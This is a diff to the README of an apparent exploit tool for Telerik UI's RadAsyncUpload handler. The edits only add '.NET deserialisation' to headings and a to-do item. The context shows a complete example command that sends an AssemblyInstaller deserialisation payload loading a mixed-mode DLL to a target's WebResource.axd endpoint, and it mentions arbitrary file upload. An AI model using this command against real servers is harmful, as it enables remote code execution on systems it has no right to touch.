@@ -17,7 +17,7 @@ My other Telerik UI exploit (for CVE-2017-9248) will probably also be of interes
 ## To do
 - [x] Missing HMAC functionality for later versions.
 - [x] Ability to specify custom key.
-- [ ] Command line argument for execution of a mixed mode dll (in the meantime use example provided below).
+- [ ] Command line argument for execution of a mixed mode dll (in the meantime use the example .NET deserialisation payload provided below).
 - [ ] Separate utility for testing mixed mode dll.
 - [ ] Provide source code/compilation instructions for mixed mode dll.
 - [ ] Brute force versions.
@@ -68,7 +68,7 @@ $
 ## Example - arbitrary file uplaod
 ![Upload screenshot](images/upload_screenshot.png)
 
-## Custom payload (deserialisation)
+## Custom payload (.NET deserialisation)
 
 For details on custom payloads for .NET deserialisation, there is a great article by [@mwulftange]( https://github.com/mwulftange ) who discovered this vulnerability on the Code White blog at the following link.
 
@@ -79,7 +79,7 @@ Other relevant links.
 - https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
 - https://threatvector.cylance.com/en_us/home/implications-of-loading-net-assemblies.html
 
-Example payload:
+Example .NET deserialisation payload:
 
 ```
 $ ./RAU_crypto.py -C '{"Path":"file:///c:/users/public/documents/mixedmode64.dll"}' 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a' http://target/Telerik.Web.UI.WebResource.axd?type=rau
